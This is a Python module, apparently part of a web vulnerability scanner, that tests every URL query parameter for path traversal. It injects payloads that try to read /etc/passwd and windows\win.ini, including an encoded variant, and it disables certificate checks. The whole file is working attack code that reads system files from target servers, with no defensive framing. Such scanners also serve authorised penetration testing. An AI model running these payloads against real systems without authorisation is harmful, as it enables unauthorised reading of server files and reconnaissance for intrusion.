import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

PAYLOADS = [
    "../../../../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..\\..\\..\\..\\windows\\win.ini",
]

def _inj(url, param, payload):
    p = urlparse(url)
    qs = parse_qs(p.query)
    qs[param] = payload
    return urlunparse(p._replace(query=urlencode(qs, doseq=True)))


def scan(url, proxies=None, session=None, **kw):
    session = session or requests.Session()
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        return {"module": "Traversal", "vulnerable": False}
    findings = []
    vulnerable = False
    for p in params:
        for pay in PAYLOADS:
            u = _inj(url, p, pay)
            r = session.get(u, proxies=proxies, timeout=8, verify=False)
            if "root:x:" in r.text or "[extensions]" in r.text:
                findings.append({"param": p, "payload": pay, "url": u})
                vulnerable = True
                break
    return {"module": "Traversal", "vulnerable": vulnerable, "findings": findings}